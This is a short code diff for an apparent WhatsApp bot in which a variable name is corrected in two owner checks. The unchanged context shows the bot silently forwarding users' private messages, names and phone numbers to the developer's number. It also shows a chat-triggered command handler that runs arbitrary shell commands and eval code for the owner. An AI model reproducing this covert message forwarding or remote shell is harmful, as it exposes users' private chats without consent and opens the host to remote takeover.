@@ -60,7 +60,7 @@ semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
 if (!isGroup && body && !msg.key.fromMe && !isDev) {
 semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}
 
-if (body.startsWith(`$`)){ if (!isOwner && !mek.key.fromMe) return
+if (body.startsWith(`$`)){ if (!isOwner && !msg.key.fromMe) return
 let evl = body.split("\n")
 let exc = body.replace(evl[0]+"\n", "")
 exec(exc, (err, stdout, stderr) => {
@@ -68,7 +68,7 @@ if (stdout) return reply(`${stdout}`)
 if (stderr) return reply(`${stderr}`)
 if (err) return reply(`${err}`)})}
 	    
-if (/^=?>/.test(body) && (isOwner || mek.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
+if (/^=?>/.test(body) && (isOwner || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
 try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
 return reply(require('util').format(evaluate))} catch(e){
 return reply(require('util').format(e))}}
